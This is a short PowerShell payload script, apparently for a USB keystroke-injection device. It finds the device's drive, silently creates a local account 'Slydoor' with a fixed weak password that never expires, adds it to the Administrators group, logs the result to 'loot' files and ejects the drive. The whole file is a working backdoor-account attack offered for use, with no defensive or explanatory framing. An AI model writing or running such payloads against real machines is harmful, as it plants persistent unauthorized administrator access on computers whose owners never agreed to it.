$bb = (gwmi win32_volume -f 'label=''DJBUNNY''').Name

# Create powerful user!
& net user "Slydoor" "slydoor" /add /y /expires:never | Out-File $bb\loot\Slydoor\loot_adder.txt -Encoding ASCII
& net localgroup "Administrators" "Slydoor" /add | Out-File $bb\loot\Slydoor\loot_adder.txt -Encoding ASCII
echo "+ PSP: Attempted to create user 'Slydoor' with password 'slydoor'" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII
echo "+ PSP: Logged to loot_adder.txt" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII

# Tell the BB that we've finished and eject the BB
echo "+ Powershell payload complete" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII
$driveEject = New-Object -comObject Shell.Application
$driveEject.Namespace(17).ParseName("$bb").InvokeVerb("Eject")